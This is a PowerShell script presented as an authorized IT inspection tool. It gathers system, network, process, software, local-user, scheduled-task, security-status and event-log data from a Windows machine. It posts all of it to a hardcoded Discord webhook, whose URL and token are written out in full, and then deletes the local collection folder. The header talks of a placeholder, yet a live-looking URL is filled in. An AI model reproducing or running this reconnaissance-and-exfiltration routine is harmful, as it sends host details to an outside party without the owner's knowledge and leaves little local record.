# ============================================
# IT SYSTEM INSPECTION SCRIPT WITH DISCORD
# For authorized IT professionals only
# Requires: Administrator privileges
# ============================================
#
# Purpose: Collect system information and send
# to Discord webhook for centralized logging
#
# Before use: Replace WEBHOOK_URL with your
# actual Discord webhook URL
# ============================================

# Configuration
$DiscordWebhook = "https://discord.com/api/webhooks/1459071758568259739/41IVLdpdgqRfFbSWRKWwBJkXqdMylVP8KIYXIO0YIMS3Db3vM2S3R-TPzRz2UYuLh6Pl"
$CollectionID = "IT-AUDIT-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$WorkDir = "C:\Windows\Temp\$CollectionID"
New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null

# Function: Send to Discord
function Send-ToDiscord {
    param(
        [string]$Message,
        [string]$FileName = $null,
        [string]$Content = $null
    )
    
    if ($FileName -and $Content) {
        # Send with file attachment
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
            "Content-Type: application/octet-stream$LF",
            $Content,
            "--$boundary",
            "Content-Disposition: form-data; name=`"content`"$LF",
            $Message,
            "--$boundary--$LF"
        ) -join $LF
        
        try {
            Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
            return $true
        } catch {
            Write-Warning "Failed to send file to Discord: $_"
            return $false
        }
    } else {
        # Send simple message
        $body = @{content = $Message} | ConvertTo-Json -Depth 3
        try {
            Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $body
            return $true
        } catch {
            Write-Warning "Failed to send message to Discord: $_"
            return $false
        }
    }
}

# Function: Send JSON data as file
function Send-DataFile {
    param(
        [string]$FilePath,
        [string]$Description
    )
    
    if (Test-Path $FilePath) {
        $fileName = Split-Path $FilePath -Leaf
        $content = Get-Content $FilePath -Raw
        $message = "📄 **$Description**`n**File:** $fileName`n**Computer:** $env:COMPUTERNAME"
        
        Send-ToDiscord -Message $message -FileName $fileName -Content $content
    }
}

# ============================================
# Initial Discord Notification
# ============================================
Write-Host "Starting IT System Inspection..." -ForegroundColor Cyan
$startMessage = "🚀 **IT Inspection Started**"
$startMessage += "`n**Computer:** $env:COMPUTERNAME"
$startMessage += "`n**Collection ID:** $CollectionID"
$startMessage += "`n**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Send-ToDiscord -Message $startMessage
Start-Sleep -Seconds 1

# ============================================
# 1. SYSTEM INFORMATION
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting System Info" -PercentComplete 10
$SystemInfo = Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer, Model, TotalPhysicalMemory, UserName
$OSInfo = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture, InstallDate, LastBootUpTime
$SystemReport = @{System=$SystemInfo;OS=$OSInfo} | ConvertTo-Json -Depth 3
$SystemReport | Out-File "$WorkDir\01_System_Info.json"

$systemSummary = "**System Information Collected:**"
$systemSummary += "`n- **Computer:** $($SystemInfo.Name)"
$systemSummary += "`n- **OS:** $($OSInfo.Caption) $($OSInfo.OSArchitecture)"
$systemSummary += "`n- **Version:** $($OSInfo.Version)"
$systemSummary += "`n- **Domain:** $($SystemInfo.Domain)"
$systemSummary += "`n- **User:** $($SystemInfo.UserName)"
Send-ToDiscord -Message $systemSummary
Start-Sleep -Seconds 1

# ============================================
# 2. HARDWARE INVENTORY
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Hardware Info" -PercentComplete 20
$CPU = Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, MaxClockSpeed
$Memory = Get-CimInstance Win32_PhysicalMemory | Select-Object Capacity, Manufacturer, PartNumber
$Disks = Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}}, @{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,2)}}
$HardwareReport = @{CPU=$CPU;Memory=$Memory;Disks=$Disks} | ConvertTo-Json -Depth 3
$HardwareReport | Out-File "$WorkDir\02_Hardware_Inventory.json"

$totalMemory = ($Memory | Measure-Object Capacity -Sum).Sum / 1GB
$hardwareSummary = "**Hardware Inventory:**"
$hardwareSummary += "`n- **CPU:** $($CPU.Name)"
$hardwareSummary += "`n- **Cores:** $($CPU.NumberOfCores)"
$hardwareSummary += "`n- **RAM:** $([math]::Round($totalMemory,2)) GB"
$hardwareSummary += "`n- **Disks:** $($Disks.Count) volumes"
Send-ToDiscord -Message $hardwareSummary
Start-Sleep -Seconds 1

# ============================================
# 3. NETWORK CONFIGURATION
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Network Info" -PercentComplete 30
$NetworkAdapters = Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object Name, InterfaceDescription, LinkSpeed, MacAddress
$IPConfig = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer
$NetworkReport = @{Adapters=$NetworkAdapters;IPConfig=$IPConfig} | ConvertTo-Json -Depth 3
$NetworkReport | Out-File "$WorkDir\03_Network_Config.json"

$networkSummary = "**Network Configuration:**"
$networkSummary += "`n- **Active Adapters:** $($NetworkAdapters.Count)"
foreach ($adapter in $NetworkAdapters) {
    $networkSummary += "`n  - $($adapter.Name): $($adapter.LinkSpeed)"
}
Send-ToDiscord -Message $networkSummary
Start-Sleep -Seconds 1

# ============================================
# 4. RUNNING PROCESSES
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Process Info" -PercentComplete 40
$Processes = Get-Process | Select-Object Name, Id, CPU, WorkingSet, StartTime -First 50
$Processes | ConvertTo-Json -Depth 3 | Out-File "$WorkDir\04_Running_Processes.json"

Send-DataFile -FilePath "$WorkDir\04_Running_Processes.json" -Description "Running Processes"
Start-Sleep -Seconds 1

# ============================================
# 5. INSTALLED SOFTWARE
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Software Info" -PercentComplete 50
$Software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object DisplayName | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$Software += Get-ItemProperty "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object DisplayName | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$Software | ConvertTo-Json -Depth 3 | Out-File "$WorkDir\05_Installed_Software.json"

$softwareCount = $Software | Measure-Object | Select-Object -ExpandProperty Count
$softwareMessage = "**Software Inventory:** $softwareCount applications found"
Send-ToDiscord -Message $softwareMessage
Start-Sleep -Seconds 1

# ============================================
# 6. USER ACCOUNTS
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting User Info" -PercentComplete 60
$LocalUsers = Get-LocalUser | Select-Object Name, Enabled, LastLogon, Description
$LocalUsers | ConvertTo-Json -Depth 3 | Out-File "$WorkDir\06_Local_Users.json"

$userMessage = "**Local User Accounts:** $($LocalUsers.Count) users found"
$enabledUsers = $LocalUsers | Where-Object Enabled -eq $true
$userMessage += "`n- **Enabled:** $($enabledUsers.Count)"
$userMessage += "`n- **Disabled:** $($LocalUsers.Count - $enabledUsers.Count)"
Send-ToDiscord -Message $userMessage
Start-Sleep -Seconds 1

# ============================================
# 7. SCHEDULED TASKS
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Scheduled Tasks" -PercentComplete 70
$Tasks = Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName, TaskPath, @{N='LastRunTime';E={$_.LastRunTime}}, @{N='NextRunTime';E={$_.NextRunTime}}
$Tasks | ConvertTo-Json -Depth 3 | Out-File "$WorkDir\07_Scheduled_Tasks.json"

$taskMessage = "**Scheduled Tasks:** $($Tasks.Count) tasks ready"
Send-ToDiscord -Message $taskMessage
Start-Sleep -Seconds 1

# ============================================
# 8. SECURITY SETTINGS
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Security Info" -PercentComplete 80
$Firewall = Get-NetFirewallProfile | Select-Object Name, Enabled
$Defender = Get-MpComputerStatus | Select-Object AntivirusEnabled, AntispywareEnabled, RealTimeProtectionEnabled
$SecurityReport = @{Firewall=$Firewall;Defender=$Defender} | ConvertTo-Json -Depth 3
$SecurityReport | Out-File "$WorkDir\08_Security_Settings.json"

$securityMessage = "**Security Status:**"
$securityMessage += "`n- **Defender Active:** $($Defender.RealTimeProtectionEnabled)"
$firewallEnabled = ($Firewall | Where-Object Enabled -eq $true).Count
$securityMessage += "`n- **Firewall Profiles:** $firewallEnabled/3 enabled"
Send-ToDiscord -Message $securityMessage
Start-Sleep -Seconds 1

# ============================================
# 9. EVENT LOGS (Last 24 hours)
# ============================================
Write-Progress -Activity "System Inspection" -Status "Collecting Event Logs" -PercentComplete 90
$24HoursAgo = (Get-Date).AddHours(-24)
$ErrorEvents = Get-WinEvent -FilterHashtable @{LogName='System','Application'; Level=1,2; StartTime=$24HoursAgo} -MaxEvents 100 -ErrorAction SilentlyContinue | Select-Object TimeCreated, LogName, ProviderName, Id, Message
if ($ErrorEvents) {
    $ErrorEvents | ConvertTo-Json -Depth 3 | Out-File "$WorkDir\09_Recent_Errors.json"
    $errorCount = $ErrorEvents | Measure-Object | Select-Object -ExpandProperty Count
    $errorMessage = "**Event Log Summary:** $errorCount errors in last 24 hours"
} else {
    $errorMessage = "**Event Log Summary:** No critical errors in last 24 hours"
}
Send-ToDiscord -Message $errorMessage
Start-Sleep -Seconds 1

# ============================================
# 10. SEND ALL DATA FILES TO DISCORD
# ============================================
Write-Progress -Activity "System Inspection" -Status "Sending Data to Discord" -PercentComplete 95

# Send each JSON file separately to Discord
$files = Get-ChildItem $WorkDir -Filter "*.json"
foreach ($file in $files) {
    $description = switch ($file.Name) {
        "01_System_Info.json" { "System Information" }
        "02_Hardware_Inventory.json" { "Hardware Inventory" }
        "03_Network_Config.json" { "Network Configuration" }
        "04_Running_Processes.json" { "Running Processes" }
        "05_Installed_Software.json" { "Installed Software" }
        "06_Local_Users.json" { "Local User Accounts" }
        "07_Scheduled_Tasks.json" { "Scheduled Tasks" }
        "08_Security_Settings.json" { "Security Settings" }
        "09_Recent_Errors.json" { "Recent Event Log Errors" }
        default { "System Data" }
    }
    
    Send-DataFile -FilePath $file.FullName -Description $description
    Start-Sleep -Seconds 2
}

# ============================================
# COMPLETION NOTIFICATION
# ============================================
$completeMessage = "✅ **IT Inspection Complete**"
$completeMessage += "`n**Computer:** $env:COMPUTERNAME"
$completeMessage += "`n**Collection ID:** $CollectionID"
$completeMessage += "`n**Files Collected:** $($files.Count)"
$completeMessage += "`n**Total Time:** $(Get-Date -Format 'HH:mm:ss')"
$completeMessage += "`n`n**Data Collected:**"
$completeMessage += "`n- System & Hardware Information"
$completeMessage += "`n- Network Configuration"
$completeMessage += "`n- $softwareCount Installed Applications"
$completeMessage += "`n- $($LocalUsers.Count) User Accounts"
$completeMessage += "`n- Security & Event Logs"
Send-ToDiscord -Message $completeMessage

# ============================================
# CLEANUP
# ============================================
Write-Progress -Activity "System Inspection" -Status "Cleaning Up" -PercentComplete 100
Remove-Item $WorkDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "`nIT Inspection Complete!" -ForegroundColor Green
Write-Host "All data sent to Discord webhook." -ForegroundColor Green
Write-Host "Temporary files cleaned up." -ForegroundColor Green
Write-Host "`nCollection ID: $CollectionID" -ForegroundColor Cyan

# Keep window open for review
Read-Host "`nPress Enter to exit"
